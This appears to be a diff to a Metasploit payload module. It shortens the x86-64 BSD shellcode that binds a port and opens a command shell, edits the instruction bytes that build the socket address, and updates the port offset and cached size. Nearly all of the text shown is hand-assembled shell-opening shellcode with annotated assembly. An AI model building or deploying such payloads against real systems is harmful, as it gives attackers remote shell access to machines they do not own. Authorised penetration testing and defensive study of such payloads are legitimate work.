@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
-  CachedSize = 93
+  CachedSize = 91
 
   include Msf::Payload::Single
   include Msf::Payload::Bsd
@@ -31,7 +31,7 @@ module Metasploit3
         {
           'Offsets' =>
             {
-              'LPORT'    => [ 19, 'n' ],
+              'LPORT'    => [ 18, 'n' ],
             },
           'Payload' =>
             "\x6a\x61"             +#	pushq  $0x61                       #
@@ -44,9 +44,10 @@ module Metasploit3
             "\x0f\x05"             +#	syscall                            #
             "\x48\x97"             +#	xchg   %rax,%rdi                   #
             "\x52"                 +#	push   %rdx                        #
-            "\x48\xba\x00\x02\x11" +#   mov    0x000000005c110200,         #
-            "\x5c\x00\x00\x00\x00" +#	       %rdx                        #
-            "\x52"                 +#	push   %rdx                        #
+            "\x68\x00\x1c\x11\x5c" +# pushq  $0x5c111c00                 #
+            "\x5a"                 +#	pop    %rdx                        #
+            "\x89\xd2"             +#	mov    %edx, %edx                  #
+            "\x52"                 +#	pushq  %rdx                        #
             "\x48\x89\xe6"         +#	mov    %rsp,%rsi                   #
             "\x6a\x10"             +#	pushq  $0x10                       #
             "\x5a"                 +#	pop    %rdx                        #
